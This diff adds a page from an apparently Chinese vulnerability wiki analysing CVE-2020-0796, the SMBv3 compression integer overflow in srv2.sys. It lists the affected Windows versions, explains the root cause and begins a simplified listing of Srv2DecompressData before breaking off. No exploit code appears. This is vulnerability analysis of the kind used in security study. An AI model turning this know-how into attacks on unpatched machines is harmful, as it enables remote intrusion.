@@ -1,0 +1,1473 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="VulWiki，漏洞库">
+      
+      
+        <link rel="canonical" href="https://wiki.secice.cn/系统安全/Windows/Windows远程溢出漏洞/（CVE­-2020­-0796） Windows 远程溢出漏洞/">
+      
+      
+        <meta name="author" content="iceH">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0, mkdocs-material-3.0.6">
+    
+    
+      
+        <title>（CVE­ 2020­ 0796） Windows 远程溢出漏洞 - Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.451f80e5.css">
+      
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="">
+      
+    
+    
+      <script src="../../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      
+    
+    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="black" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#cve-2020-0796-windows" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://wiki.secice.cn/" title="Wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                Wiki
+              </span>
+              <span class="md-header-nav__topic">
+                （CVE­ 2020­ 0796） Windows 远程溢出漏洞
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://github.com/root-iceH/VulWiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      root-iceH/VulWiki
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://wiki.secice.cn/" title="Wiki" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://github.com/root-iceH/VulWiki/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      root-iceH/VulWiki
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../../.." title="前言" class="md-nav__link">
+      前言
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      系统安全
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        系统安全
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1">
+    
+    <label class="md-nav__link" for="nav-2-1">
+      Linux
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-1">
+        Linux
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-1" type="checkbox" id="nav-2-1-1">
+    
+    <label class="md-nav__link" for="nav-2-1-1">
+      Linux本地提权漏洞
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-1-1">
+        Linux本地提权漏洞
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Linux/Linux本地提权漏洞/（CVE-2015-1328）Ubuntu Linux内核本地提权漏洞/" title="（CVE-2015-1328）Ubuntu Linux内核本地提权漏洞" class="md-nav__link">
+      （CVE-2015-1328）Ubuntu Linux内核本地提权漏洞
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Linux/Linux本地提权漏洞/（CVE-2016-5195）脏牛Linux 本地提权/" title="（CVE-2016-5195）脏牛Linux 本地提权.md" class="md-nav__link">
+      （CVE-2016-5195）脏牛Linux 本地提权.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Linux/Linux本地提权漏洞/（CVE-2017-16995）Ubuntu 内核提权/" title="（CVE-2017-16995）Ubuntu 内核提权" class="md-nav__link">
+      （CVE-2017-16995）Ubuntu 内核提权
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Linux/Linux本地提权漏洞/（CVE-2019-14287）sudo提权漏洞/" title="（CVE-2019-14287）sudo提权漏洞" class="md-nav__link">
+      （CVE-2019-14287）sudo提权漏洞
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-2" type="checkbox" id="nav-2-1-2">
+    
+    <label class="md-nav__link" for="nav-2-1-2">
+      Linux远程溢出漏洞
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-1-2">
+        Linux远程溢出漏洞
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../Linux/Linux远程溢出漏洞/（CVE-2017-7494）Linux Samba 远程代码执行/" title="（CVE-2017-7494）Linux Samba 远程代码执行" class="md-nav__link">
+      （CVE-2017-7494）Linux Samba 远程代码执行
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2" checked>
+    
+    <label class="md-nav__link" for="nav-2-2">
+      Windows
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        Windows
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-1" type="checkbox" id="nav-2-2-1">
+    
+    <label class="md-nav__link" for="nav-2-2-1">
+      Windows本地提权漏洞
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-2-1">
+        Windows本地提权漏洞
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2016-0099）【MS16-32】 windows 本地提权漏洞/" title="（CVE-2016-0099）【MS16-32】 windows 本地提权漏洞" class="md-nav__link">
+      （CVE-2016-0099）【MS16-32】 windows 本地提权漏洞
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2016-3225）【MS16-075】 JuicyPotato windows 本地提权漏洞/" title="（CVE-2016-3225）【MS16-075】 JuicyPotato windows 本地提权漏洞" class="md-nav__link">
+      （CVE-2016-3225）【MS16-075】 JuicyPotato windows 本地提权漏洞
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2018-8120）Windows本地提权漏洞/" title="（CVE-2018-8120）Windows本地提权漏洞.md" class="md-nav__link">
+      （CVE-2018-8120）Windows本地提权漏洞.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2018-8453）Windows 本地提权漏洞/" title="（CVE-2018-8453）Windows 本地提权漏洞.md" class="md-nav__link">
+      （CVE-2018-8453）Windows 本地提权漏洞.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2018-8639）Windows 本地提权漏洞/" title="（CVE-2018-8639）Windows 本地提权漏洞.md" class="md-nav__link">
+      （CVE-2018-8639）Windows 本地提权漏洞.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2019-0803）Win32K组件提权/" title="（CVE-2019-0803）Win32K组件提权" class="md-nav__link">
+      （CVE-2019-0803）Win32K组件提权
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2019-1388）Windows UAC提权漏洞/" title="（CVE-2019-1388）Windows UAC提权漏洞.md" class="md-nav__link">
+      （CVE-2019-1388）Windows UAC提权漏洞.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2019-1458）Win32k本地提权/" title="（CVE-2019-1458）Win32k本地提权漏洞.md" class="md-nav__link">
+      （CVE-2019-1458）Win32k本地提权漏洞.md
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2020-0787）Windows 本地提权漏洞/" title="（CVE-2020-0787）Windows 本地提权漏洞" class="md-nav__link">
+      （CVE-2020-0787）Windows 本地提权漏洞
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2020-0796）Windows 本地提权漏洞/" title="CVE-2020-0796" class="md-nav__link">
+      CVE-2020-0796
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2020-1054）Windows 本地提权漏洞/" title="（CVE-2020-1054）Windows 本地提权漏洞" class="md-nav__link">
+      （CVE-2020-1054）Windows 本地提权漏洞
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Windows本地提权漏洞/（CVE-2020-1472）Windows Zerologon域提权漏洞/" title="CVE-2020-1472" class="md-nav__link">
+      CVE-2020-1472
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2-2" type="checkbox" id="nav-2-2-2" checked>
+    
+    <label class="md-nav__link" for="nav-2-2-2">
+      Windows远程溢出漏洞
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-2-2">
+        Windows远程溢出漏洞
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../（CVE-2008-4250）【MS08-067】Windows远程溢出漏洞/" title="（CVE 2008 4250）【MS08 067】Windows远程溢出漏洞" class="md-nav__link">
+      （CVE 2008 4250）【MS08 067】Windows远程溢出漏洞
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../（CVE-2017-0143........）【MS17-010】Windows 远程溢出漏洞/" title="（CVE 2017 0143........）【MS17 010】Windows 远程溢出漏洞" class="md-nav__link">
+      （CVE 2017 0143........）【MS17 010】Windows 远程溢出漏洞
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../（CVE-2019-0708） Windows 远程溢出漏洞/" title="（CVE 2019 0708） Windows 远程溢出漏洞" class="md-nav__link">
+      （CVE 2019 0708） Windows 远程溢出漏洞
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        （CVE­ 2020­ 0796） Windows 远程溢出漏洞
+      </label>
+    
+    <a href="./" title="（CVE­ 2020­ 0796） Windows 远程溢出漏洞" class="md-nav__link md-nav__link--active">
+      （CVE­ 2020­ 0796） Windows 远程溢出漏洞
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cve-2020-0796-windows" title="（CVE­-2020­-0796） Windows 远程溢出漏洞" class="md-nav__link">
+    （CVE­-2020­-0796） Windows 远程溢出漏洞
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="一、漏洞简介" class="md-nav__link">
+    一、漏洞简介
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="二、漏洞影响" class="md-nav__link">
+    二、漏洞影响
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="三、复现过程" class="md-nav__link">
+    三、复现过程
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="漏洞分析" class="md-nav__link">
+    漏洞分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" title="1、根本原因" class="md-nav__link">
+    1、根本原因
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" title="2、初步分析" class="md-nav__link">
+    2、初步分析
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" title="3、选择溢出内容" class="md-nav__link">
+    3、选择溢出内容
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4srvnetallocatebuffer" title="4、深入分析SrvNetAllocateBuffer" class="md-nav__link">
+    4、深入分析SrvNetAllocateBuffer
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5srvnetallocatebufferfrompool" title="5、SrvNetAllocateBufferFromPool和分配的缓冲区布局" class="md-nav__link">
+    5、SrvNetAllocateBufferFromPool和分配的缓冲区布局
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6" title="6、重写分配头结构" class="md-nav__link">
+    6、重写分配头结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7" title="7、本地权限提升" class="md-nav__link">
+    7、本地权限提升
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cve20200796-rce" title="四、CVE­2020­0796 RCE漏洞复现" class="md-nav__link">
+    四、CVE­2020­0796 RCE漏洞复现
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="环境准备" class="md-nav__link">
+    环境准备
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve20200796" title="五、CVE­2020­0796 本地提权漏洞复现" class="md-nav__link">
+    五、CVE­2020­0796 本地提权漏洞复现
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" title="六、漏洞检测" class="md-nav__link">
+    六、漏洞检测
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" title="七、漏洞修复" class="md-nav__link">
+    七、漏洞修复
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" title="八、参考连接" class="md-nav__link">
+    八、参考连接
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#cve-2020-0796-windows" title="（CVE­-2020­-0796） Windows 远程溢出漏洞" class="md-nav__link">
+    （CVE­-2020­-0796） Windows 远程溢出漏洞
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" title="一、漏洞简介" class="md-nav__link">
+    一、漏洞简介
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" title="二、漏洞影响" class="md-nav__link">
+    二、漏洞影响
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="三、复现过程" class="md-nav__link">
+    三、复现过程
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="漏洞分析" class="md-nav__link">
+    漏洞分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" title="1、根本原因" class="md-nav__link">
+    1、根本原因
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" title="2、初步分析" class="md-nav__link">
+    2、初步分析
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" title="3、选择溢出内容" class="md-nav__link">
+    3、选择溢出内容
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4srvnetallocatebuffer" title="4、深入分析SrvNetAllocateBuffer" class="md-nav__link">
+    4、深入分析SrvNetAllocateBuffer
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5srvnetallocatebufferfrompool" title="5、SrvNetAllocateBufferFromPool和分配的缓冲区布局" class="md-nav__link">
+    5、SrvNetAllocateBufferFromPool和分配的缓冲区布局
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6" title="6、重写分配头结构" class="md-nav__link">
+    6、重写分配头结构
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7" title="7、本地权限提升" class="md-nav__link">
+    7、本地权限提升
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cve20200796-rce" title="四、CVE­2020­0796 RCE漏洞复现" class="md-nav__link">
+    四、CVE­2020­0796 RCE漏洞复现
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="环境准备" class="md-nav__link">
+    环境准备
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve20200796" title="五、CVE­2020­0796 本地提权漏洞复现" class="md-nav__link">
+    五、CVE­2020­0796 本地提权漏洞复现
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" title="六、漏洞检测" class="md-nav__link">
+    六、漏洞检测
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" title="七、漏洞修复" class="md-nav__link">
+    七、漏洞修复
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" title="八、参考连接" class="md-nav__link">
+    八、参考连接
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/root-iceH/VulWiki/edit/master/docs/系统安全/Windows/Windows远程溢出漏洞/（CVE­-2020­-0796） Windows 远程溢出漏洞.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                  <h1>（CVE­ 2020­ 0796） Windows 远程溢出漏洞</h1>
+                
+                <h2 id="cve-2020-0796-windows">（CVE­-2020­-0796） Windows 远程溢出漏洞<a class="headerlink" href="#cve-2020-0796-windows" title="Permanent link">&para;</a></h2>
+<h3 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>漏洞公告显示，SMB
+3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p>
+<h3 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>Windows 10 1903版本（用于基于x32的系统）</p>
+<p>Windows 10 1903版（用于基于x64的系统）</p>
+<p>Windows 10 1903版（用于基于ARM64的系统） Windows Server
+1903版（服务器核心安装）
+Windows 10 1909版本（用于基于x32的系统） Windows
+10版本1909（用于基于x64的系统）
+Windows 10 1909版（用于基于ARM64的系统） Windows
+Server版本1909（服务器核心安装）</p>
+<h3 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>漏洞公告显示，SMB
+3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p>
+<h4 id="1">1、根本原因<a class="headerlink" href="#1" title="Permanent link">&para;</a></h4>
+<p>漏洞发生在srv2.sys中,由于SMB没有正确处理压缩的数据包,在解压数据包的时候使用客户端传过来的长度进行解压时,并没有检查长度是否合法.最终导致整数溢出。</p>
+<h4 id="2">2、初步分析<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
+<p>该错误是发生在srv2.sys
+SMB服务器驱动程序中的Srv2DecompressData函数中的整数溢出错误。这是该函数的简化版本，省略了不相关的细节：</p>
+<div class="codehilite"><pre><span></span><span class="n">typedef</span> <span class="n">struct</span> <span class="err">\</span><span class="n">_COMPRESSION_TRANSFORM_HEADER</span>
+
+<span class="err">{</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">ULONG</span> <span class="n">ProtocolId</span><span class="p">;</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">ULONG</span> <span class="n">OriginalCompressedSegmentSize</span><span class="p">;</span> <span class="n">USHORT</span> <span class="n">CompressionAlgorithm</span><span class="p">;</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">USHORT</span> <span class="n">Flags</span><span class="p">;</span> <span class="n">ULONG</span> <span class="k">Offset</span><span class="p">;</span>
+
+<span class="err">}</span> <span class="n">COMPRESSION_TRANSFORM_HEADER</span><span class="p">,</span> <span class="err">\</span><span class="o">*</span><span class="n">PCOMPRESSION_TRANSFORM_HEADER</span><span class="p">;</span>
+
+<span class="n">typedef</span> <span class="n">struct</span> <span class="err">\</span><span class="n">_ALLOCATION_HEADER</span>
+
+<span class="err">{</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="o">//</span> <span class="p">...</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">PVOID</span> <span class="n">UserBuffer</span><span class="p">;</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="o">//</span> <span class="p">...</span>
+
+<span class="err">}</span> <span class="n">ALLOCATION_HEADER</span><span class="p">,</span> <span class="err">\</span><span class="o">*</span><span class="n">PALLOCATION_HEADER</span><span class="p">;</span>
+
+<span class="n">NTSTATUS</span> <span class="n">Srv2DecompressData</span><span class="p">(</span><span class="n">PCOMPRESSION_TRANSFORM_HEADER</span> <span class="n">Header</span><span class="p">,</span> <span class="n">SIZE_T</span>
+<span class="n">TotalSize</span><span class="p">)</span>
+
+<span class="err">{</span>
+
+<span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span>   <span class="n">PALLOCATION_HEADER</span> <span class="n">Alloc</span> <span class="o">=</span> <span class="n">SrvNetAllocateBuffer</span><span class="p">(</span>
+
